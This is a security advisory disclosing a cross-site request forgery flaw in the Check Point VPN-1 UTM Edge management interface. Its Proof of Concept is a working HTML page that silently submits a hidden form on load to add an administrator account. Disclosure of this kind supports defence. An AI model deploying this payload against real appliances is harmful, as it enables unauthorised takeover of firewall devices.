Overview:

    Quote from http://www.checkpoint.com/
    "VPN-1 UTM Edge appliances deliver unified threat management to
     enterprises with branch offices and simplify security deployments
     and manageability. VPN-1 UTM Edge appliances consolidate proven
     enterprise-class technology into a single branch office solution
     that does not compromise the corporate network and eliminates the
     branch office as your weakest link. As part of Check Point's Unified
     Security Architecture, VPN-1 UTM Edge can enforce a global security
     policy and allows administrators to manage and update thousands of
     appliances as easily as managing one."

    During an audit of VPN-1 UTM Edge it was discovered that a cross site
    request forgery vulnerability exists in the management interface.
    Thus, it is possible for an attacker to perform any administrative
    actions in the management interface. These include e.g. adding
    additional admin users.


Details:

    Checkpoint VPN-1 Edge Embedded device management interface does not
    validate the origin of an HTTP request. If attacker is able to make
    user visit a hostile web page, a VPN-1 Edge device can be controlled
    by submitting suitable forms. It is possible to add new users for
    example.

    Successful attack requires that the attacker knows the management
    interface address for the target device. As the management interface
    does not have logout functionality, user can be vulnerable to this
    attack even after closing a tab containing the management interface
    (if user does not close the browser window or clear cookies and
    depending on browser behaviour).


Proof of Concept:

    Example form (adds new read-only administrator):

    <html>
    <body onload="document.CSRF.submit()">
    <form name="CSRF" method="post"
     action="https://fw.example.com/pop/WizU.html "style="display:none">

    <input name="swstate" value="WizU1">
    <input name="swtosave" value="1">
    <input name="swback" value="0">
    <input name="swindex" value="-1">
    <input name="swuuser" value="evil-user">
    <input name="swupass" value="password">
    <input name="swuexp" value="0">
    <input name="swuday" value="4">
    <input name="swumonth" value="5">
    <input name="swuyear" value="2008">
    <input name="swuhour" value="03">
    <input name="swumin" value="11">
    <input name="swuampm" value="1">
    <input name="swuacc" value="1">
    <input name="swuvpn" value="0">
    <input name="swuufp" value="0">
    <input name="swuhot" value="0">
    <input name="tacc" value="1">

    </form>
    </body>
    </html>


Workaround:

    Update to new version.
